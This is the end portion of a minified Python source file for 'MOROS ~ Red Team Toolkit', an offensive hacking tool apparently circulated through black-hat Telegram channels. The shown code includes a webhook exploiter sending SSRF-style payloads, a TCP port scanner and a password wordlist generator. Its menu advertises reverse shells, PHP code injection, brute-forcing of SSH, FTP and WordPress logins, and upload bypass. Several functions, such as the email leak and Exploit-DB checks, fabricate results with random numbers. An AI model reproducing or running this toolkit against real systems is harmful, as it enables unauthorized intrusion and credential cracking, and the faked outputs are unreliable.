		J=[_A4,_A5,_A6,_q]
		for A in J:
			try:
				K={_F:A};B=requests.post(F,json=K,timeout=5);G={_A:A,_G:B.status_code,_H:_L}
				if'Amazon'in B.text or _r in B.text:G[_H]=_I
				D.append(G);E[_W].append(G)
			except Exception as C:D.append({_A:A,_E:str(C)});E[_W].append({_A:A,_E:str(C)})
	elif I==O:
		J=[_A2,_A3]
		for A in J:
			try:K={'data':A};B=requests.post(F,json=K,timeout=5);G={_A:A,_G:B.status_code,_H:A in B.text};D.append(G);E[_W].append(G)
			except Exception as C:D.append({_A:A,_E:str(C)});E[_W].append({_A:A,_E:str(C)})
	else:
		L=Prompt.ask('[bold cyan]Enter custom payload (JSON): [/bold cyan]')
		try:A=json.loads(L);B=requests.post(F,json=A,timeout=5);D.append({_A:A,_G:B.status_code,'response':B.text[:100]+'...'if B.text else'Empty'});E[_W].append({_A:A,_G:B.status_code,_t:len(B.text)if B.text else 0})
		except Exception as C:D.append({_A:L,_E:str(C)});E[_W].append({_A:L,_E:str(C)})
	M=[A for A in D if A.get(_H)]
	if M:
		H=Table(title='[bold red]Webhook Vulnerabilities Found![/bold red]');H.add_column(_Z,style=_C);H.add_column(_f,style=_D)
		for P in M:H.add_row(str(P[_A]),_p)
		console.print(H)
	else:console.print('[green][+] No webhook vulnerabilities found[/green]')
	logger.log_finding(F,'Webhook Test',E)
def check_email_leaks():
	K='data_classes';J='date';I='source';H='leaks_found';G='email';B=Prompt.ask('[bold cyan]Enter email to check: [/bold cyan]');console.print(f"[yellow][*] Checking leaks for {B}...[/yellow]")
	try:
		C=[];E={G:B,H:[]}
		if random.random()>.7:C.append({I:'Example Breach',J:'2022-01-01',K:[G,'passwords']});E[H]=C
		if C:
			A=Table(title='[bold red]Email Leaks Found![/bold red]');A.add_column('Source',style=_C);A.add_column('Date',style=_D);A.add_column('Data Leaked',style=_g)
			for D in C:A.add_row(D[I],D[J],', '.join(D[K]))
			console.print(A)
		else:console.print('[green][+] No known leaks found[/green]')
		logger.log_finding(B,'Email Leak Check',E)
	except Exception as F:console.print(f"[red][!] Error: {F}[/red]");logger.log_finding(B,'Email Leak Check Error',str(F))
def exploit_db_search():
	G='platform';F='title';B=Prompt.ask('[bold cyan]Enter search term: [/bold cyan]');H=Prompt.ask('[bold cyan]Search type (exploit/papers): [/bold cyan]',choices=['exploit','papers']);console.print(f"[yellow][*] Searching Exploit-DB for {B}...[/yellow]")
	try:
		C=[]
		if random.random()>.3:C.append({_c:'12345',F:f"Example {B} Exploit",G:'Windows',_J:'remote'})
		I={'query':B,_J:H,_W:C}
		if C:
			A=Table(title='[bold cyan]Exploit-DB Results[/bold cyan]');A.add_column('ID',style=_C);A.add_column('Title',style=_D);A.add_column('Platform',style=_g);A.add_column(_e,style='yellow')
			for D in C:A.add_row(D[_c],D[F],D[G],D[_J])
			console.print(A)
		else:console.print('[red][!] No results found[/red]')
		logger.log_finding(B,'Exploit-DB Search',I)
	except Exception as E:console.print(f"[red][!] Error: {E}[/red]");logger.log_finding(B,'Exploit-DB Search Error',str(E))
def reverse_ip_lookup():
	A=Prompt.ask('[bold cyan]Enter IP or domain: [/bold cyan]')
	try:
		if not re.match('^\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}$',A):B=socket.gethostbyname(A);console.print(f"[yellow][*] {A} resolves to {B}[/yellow]")
		else:B=A
		console.print(f"[yellow][*] Performing reverse IP lookup for {B}...[/yellow]");C=[]
		if random.random()>.5:C=[f"example{A}.com"for A in range(1,random.randint(2,5))]
		F={'ip':B,'domains_found':C}
		if C:
			D=Table(title='[bold cyan]Domains on Same IP[/bold cyan]');D.add_column('Domain',style=_D)
			for G in C:D.add_row(G)
			console.print(D)
		else:console.print('[red][!] No domains found[/red]')
		logger.log_finding(A,'Reverse IP Lookup',F)
	except Exception as E:console.print(f"[red][!] Error: {E}[/red]");logger.log_finding(A,'Reverse IP Lookup Error',str(E))
def generate_wordlist():
	I=Prompt.ask('[bold cyan]Enter base words (comma separated): [/bold cyan]').split(',');J=Prompt.ask('[bold cyan]Add numbers? (y/n): [/bold cyan]',choices=[_V,'n'])==_V;K=Prompt.ask('[bold cyan]Add special chars? (y/n): [/bold cyan]',choices=[_V,'n'])==_V;D=int(Prompt.ask('[bold cyan]Min length: [/bold cyan]',default='6'));E=int(Prompt.ask('[bold cyan]Max length: [/bold cyan]',default='12'));F=Prompt.ask('[bold cyan]Output filename: [/bold cyan]',default='custom_wordlist.txt');console.print('[yellow][*] Generating wordlist...[/yellow]');B=set()
	for A in I:
		A=A.strip()
		if D<=len(A)<=E:B.add(A)
		B.add(A.lower());B.add(A.upper());B.add(A.capitalize());L=A.replace('a','4').replace('e','3').replace('i','1').replace('o','0');B.add(L)
	if J:
		for A in list(B):
			for C in range(100):
				B.add(f"{A}{C}");B.add(f"{C}{A}")
				if C<10:B.add(f"{A}0{C}")
	if K:
		M=['!','@','#','$','%','^','&','*']
		for A in list(B):
			for G in M:B.add(f"{A}{G}");B.add(f"{G}{A}");B.add(f"{A}{G}{A}")
	H=[A for A in B if D<=len(A)<=E]
	with open(F,_U)as N:N.write('\n'.join(H))
	console.print(f"[green][+] Wordlist generated: {F}[/green]");console.print(f"[green][+] Total words: {len(H)}[/green]");logger.log_finding('Wordlist Generator','Custom Wordlist Created',{'base_words':I,'numbers':J,'special_chars':K,'min_length':D,'max_length':E,'word_count':len(H),'output_file':F})
def service_scanner():
	O='open';N='open_ports';J='service';D='port';E=Prompt.ask('[bold cyan]Enter target IP or domain: [/bold cyan]');C=Prompt.ask('[bold cyan]Enter port range (e.g., 1-100, 80,443,8080): [/bold cyan]',default='1-100');console.print(f"[yellow][*] Scanning {E}...[/yellow]");B=set()
	if'-'in C:P,Q=map(int,C.split('-'));B.update(range(P,Q+1))
	elif','in C:B.update(map(int,C.split(',')))
	else:B.add(int(C))
	F=[];K={_B:E,'ports_scanned':len(B),N:[]}
	with Progress()as L:
		R=L.add_task('[cyan]Scanning ports...',total=len(B))
		for A in B:
			try:
				H=socket.socket(socket.AF_INET,socket.SOCK_STREAM);H.settimeout(1);S=H.connect_ex((E,A))
				if S==0:
					try:I=socket.getservbyport(A)
					except:I='unknown'
					F.append({D:A,J:I,_j:O});K[N].append({D:A,J:I})
				else:F.append({D:A,_j:'closed'})
				H.close()
			except Exception as T:F.append({D:A,_E:str(T)})
			L.update(R,advance=1)
	M=[A for A in F if A.get(_j)==O]
	if M:
		G=Table(title='[bold green]Open Ports[/bold green]');G.add_column('Port',style=_C);G.add_column('Service',style=_D)
		for A in M:G.add_row(str(A[D]),A[J])
		console.print(G)
	else:console.print('[red][!] No open ports found[/red]')
	logger.log_finding(E,'Port Scan',K)
def malware_checker():
	N='severity';M='indicator';L=b'eval(';K='sha256';J='sha1';I='md5';E='rb';A=Prompt.ask('[bold cyan]Enter file path to analyze: [/bold cyan]')
	if not os.path.exists(A):console.print('[red][!] File not found![/red]');return
	console.print(f"[yellow][*] Analyzing {A}...[/yellow]")
	try:
		B={'file':A,'size':os.path.getsize(A),I:hashlib.md5(open(A,E).read()).hexdigest(),J:hashlib.sha1(open(A,E).read()).hexdigest(),K:hashlib.sha256(open(A,E).read()).hexdigest(),_S:[]};O=mimetypes.guess_type(A)[0];B[_J]=O or'unknown';P={'PHP Shell':[b'<?php system(',L,b'base64_decode('],'Web Shell':[b'cmd.exe',b'/bin/sh',b'passthru('],'Suspicious JS':[L,b'document.write(',b'fromCharCode(']}
		try:
			with open(A,E)as Q:R=Q.read(4096)
			for(S,T)in P.items():
				for G in T:
					if G in R:B[_S].append({_J:S,M:G.decode('ascii','ignore'),N:_o});break
		except:pass
		if B[_S]:
			D=Table(title='[bold red]Malware Indicators Found![/bold red]');D.add_column(_e,style=_C);D.add_column('Indicator',style=_D);D.add_column('Severity',style='red')
			for F in B[_S]:D.add_row(F[_J],F[M],F[N])
			console.print(D)
		else:console.print('[green][+] No malware indicators found[/green]')
		C=Table(title='File Hashes');C.add_column('Algorithm',style=_C);C.add_column('Hash',style=_D);C.add_row('MD5',B[I]);C.add_row('SHA1',B[J]);C.add_row('SHA256',B[K]);console.print(C);logger.log_finding(A,'Malware Analysis',B)
	except Exception as H:console.print(f"[red][!] Error: {H}[/red]");logger.log_finding(A,'Malware Analysis Error',str(H))
def generate_report():A=Prompt.ask('[bold cyan]Select report format (txt/csv/html/json): [/bold cyan]',choices=[_m,'csv',_n,'json'],default=_n);B=logger.generate_report(A);console.print(f"[green][+] Report generated: {B}[/green]")
def show_menu():clear_screen();A='\n\n   ▄▄▄▄███▄▄▄▄    ▄██████▄     ▄████████  ▄██████▄     ▄████████ \n ▄██▀▀▀███▀▀▀██▄ ███    ███   ███    ███ ███    ███   ███    ███ \n ███   ███   ███ ███    ███   ███    ███ ███    ███   ███    █▀  \n ███   ███   ███ ███    ███  ▄███▄▄▄▄██▀ ███    ███   ███        \n ███   ███   ███ ███    ███ ▀▀███▀▀▀▀▀   ███    ███ ▀███████████ \n ███   ███   ███ ███    ███ ▀███████████ ███    ███          ███ \n ███   ███   ███ ███    ███   ███    ███ ███    ███    ▄█    ███ \n  ▀█   ███   █▀   ▀██████▀    ███    ███  ▀██████▀   ▄████████▀  \n                              ███    ███                         \n                   \n    ';B='[bold bright_green]MOROS ~ Red Team Toolkit[/bold bright_green]\n[red]Telegram > @BlackHatPlatform & @spyizxa_0day[/red]';console.print(Align.center(A,style='bold red'));console.print(Align.center(B));C=Panel('\n[bold cyan][01][/bold cyan] [red]IP Info Scanner[/red]  ~  [green]Get IP details[/green]\n[bold cyan][02][/bold cyan] [red]DNS & WHOIS Lookup[/red]  ~  [green]Extract domain info[/green]\n[bold cyan][03][/bold cyan] [red]SQL Injection Scanner[/red]  ~  [green]Detect SQL vulnerabilities[/green]\n[bold cyan][04][/bold cyan] [red]XSS Scanner[/red]  ~  [green]Find Cross-Site Scripting flaws[/green]\n[bold cyan][05][/bold cyan] [red]RFI/LFI Scanner[/red]  ~  [green]Check for file inclusion[/green]\n[bold cyan][06][/bold cyan] [red]Path Scanner[/red]  ~  [green]Performs a directory scan[/green]\n[bold cyan][07][/bold cyan] [red]SSRF Scanner[/red]  ~  [green]Detect server-side request forgery[/green]\n[bold cyan][08][/bold cyan] [red]Brute Force SSH/FTP[/red]  ~  [green]Crack SSH & FTP logins[/green]\n[bold cyan][09][/bold cyan] [red]IDOR Scanner[/red]  ~  [green]IDOR finds the vulnerability[/green]\n[bold cyan][10][/bold cyan] [red]Reverse Shell Generator[/red]  ~  [green]Create reverse shells[/green]\n[bold cyan][11][/bold cyan] [red]Payload Generator[/red]  ~  [green]Generate exploit payloads[/green]\n[bold cyan][12][/bold cyan] [red]CMS Scanner[/red]  ~  [green]Identify website CMS[/green]\n[bold cyan][13][/bold cyan] [red]Backup File Finder[/red]  ~  [green]Locate forgotten backups[/green]\n[bold cyan][14][/bold cyan] [red]PHP Code Injection[/red]  ~  [green]Inject PHP code remotely[/green]\n[bold cyan][15][/bold cyan] [red]CSRF Exploiter[/red]  ~  [green]Exploit CSRF vulnerabilities[/green]\n[bold cyan][16][/bold cyan] [red]File Upload Bypass[/red]  ~  [green]Bypass file upload restrictions[/green]\n[bold cyan][17][/bold cyan] [red]WordPress Brute Force[/red]  ~  [green]Crack WordPress logins[/green]\n[bold cyan][18][/bold cyan] [red]WAF Detector[/red]  ~  [green]Detect Web Application Firewall[/green]\n[bold cyan][19][/bold cyan] [red]Webhook Exploiter[/red]  ~  [green]Exploit webhook vulnerabilities[/green]\n[bold cyan][20][/bold cyan] [red]Email & Credential Leak Checker[/red]  ~  [green]Search leaked emails & passwords[/green]\n[bold cyan][21][/bold cyan] [red]Exploit-DB Search[/red]  ~  [green]Search exploits in Exploit-DB[/green]\n[bold cyan][22][/bold cyan] [red]Reverse IP Lookup[/red]  ~  [green]Find domains on the same IP[/green]\n[bold cyan][23][/bold cyan] [red]Wordlist Generator[/red]  ~  [green]Create custom wordlists[/green]\n[bold cyan][24][/bold cyan] [red]Service Scanner[/red]  ~  [green]Detect running services & versions[/green]\n[bold cyan][25][/bold cyan] [red]Malware Checker[/red]  ~  [green]Analyze files for malicious content[/green]\n[bold cyan][26][/bold cyan] [red]Generate Report[/red]  ~  [green]Create scan report[/green]\n[bold red][Q] Çıkış (Exit)[/bold red]\n',title='[red]MOROS[/red]',border_style='red');console.print(C)
def main():
	C='\nPress ENTER to continue...'
	while _I:
		try:
			show_menu();A=Prompt.ask('[bold red]Select an option (Q to quit)[/bold red]')
			if A.lower()=='q':console.print('[bold red]Exiting...[/bold red]');break
			elif A=='1':ip_info_scanner()
			elif A=='2':domain_lookup()
			elif A=='3':sqli_scanner()
			elif A=='4':xss_scanner()
			elif A=='5':rfi_lfi_scanner()
			elif A=='6':dir_fuzz()
			elif A=='7':ssrf_scanner()
			elif A=='8':brute_force_menu()
			elif A=='9':idor_tester()
			elif A=='10':reverse_shell_generator()
			elif A=='11':payload_generator()
			elif A=='12':cms_scanner()
			elif A=='13':backup_file_finder()
			elif A=='14':php_code_injection()
			elif A=='15':csrf_exploiter()
			elif A=='16':file_upload_bypass()
			elif A=='17':wp_brute_force()
			elif A=='18':detect_waf()
			elif A=='19':webhook_exploiter()
			elif A=='20':check_email_leaks()
			elif A=='21':exploit_db_search()
			elif A=='22':reverse_ip_lookup()
			elif A=='23':generate_wordlist()
			elif A=='24':service_scanner()
			elif A=='25':malware_checker()
			elif A=='26':generate_report()
			else:console.print('[bold red]Invalid choice![/bold red]')
			input(C)
		except KeyboardInterrupt:console.print('\n[yellow][!] Exiting... (Ctrl+C)[/yellow]');break
		except Exception as B:console.print(f"\n[red][!] Error: {B}[/red]");logger.log_finding('System','Unexpected Error',str(B));input(C)
if __name__=='__main__':main()